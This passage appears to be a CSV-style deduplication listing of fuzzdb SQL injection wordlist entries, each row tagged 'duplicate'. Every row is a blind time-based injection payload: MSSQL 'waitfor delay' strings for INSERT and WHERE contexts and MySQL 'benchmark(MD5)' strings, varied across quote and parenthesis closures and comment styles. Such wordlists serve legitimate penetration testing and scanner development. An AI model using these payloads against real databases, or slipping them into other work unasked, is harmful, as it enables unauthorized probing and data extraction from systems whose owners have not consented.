+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,33,"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,34,"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,35,"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,36,"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,37,",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,38,",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,39,"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,40,"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,41,""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,42,""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,43,"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,44,"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,45,"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,46,"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,47,"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,48,"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,49,",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,50,",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,51,"',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,52,"',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,53,""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,54,""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,55,"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,56,"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,57,"'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,58,"'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,59,"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,60,"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,61,",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,62,",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,63,"',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,64,"',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,65,""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,66,""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,67,"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,68,"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,69,"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,70,"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,71,"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,72,"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,73,",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,74,"',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,75,"',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,76,""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,77,""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,78,"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,79,"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,80,"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,81,"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,82,"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,83,"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,84,",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,85,",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,86,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,87,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,88,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,89,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,90,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,91,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,92,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,93,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,94,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,95,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,96,",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,97,",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,98,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,99,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,100,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,101,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,102,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,103,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,104,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,105,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,106,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,107,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,1, waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,2, waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,3,' waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,4,' waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,5,""" waitfor delay '0:0:20' /* ",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,6,""" waitfor delay '0:0:20' --",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,7,) waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,8,) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,9,)) waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,10,)) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,11,))) waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,12,))) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,13,)))) waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,14,)))) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,15,))))) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,16,)))))) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,17,') waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,18,') waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,19,""") waitfor delay '0:0:20' /* ",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,20,""") waitfor delay '0:0:20' --",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,21,')) waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,22,')) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,23,""")) waitfor delay '0:0:20' /* ",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,24,""")) waitfor delay '0:0:20' --",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,25,'))) waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,26,'))) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,27,"""))) waitfor delay '0:0:20' /* ",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,28,"""))) waitfor delay '0:0:20' --",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,29,')))) waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,30,')))) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,31,""")))) waitfor delay '0:0:20' /* ",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,32,""")))) waitfor delay '0:0:20' --",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,33,'))))) waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,34,'))))) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,35,"""))))) waitfor delay '0:0:20' /* ",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,36,"""))))) waitfor delay '0:0:20' --",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,37,')))))) waitfor delay '0:0:20' /* ,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,38,')))))) waitfor delay '0:0:20' --,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,39,""")))))) waitfor delay '0:0:20' /* ",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt,40,""")))))) waitfor delay '0:0:20' --",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,1,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,2,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,3,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,4,"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,5,"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,6,"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,7,"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,8,"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,9,"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,10,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* ",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,11,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,12,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,13,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* ",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,14,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,15,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,16,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* ",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,17,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,18,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,19,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,20,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,21,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,22,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,23,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,24,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,25,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,26,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,27,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,28,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,29,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,30,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,31,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,32,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,33,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,34,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,35,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,36,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,37,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,38,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,39,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,40,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,41,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",duplicate
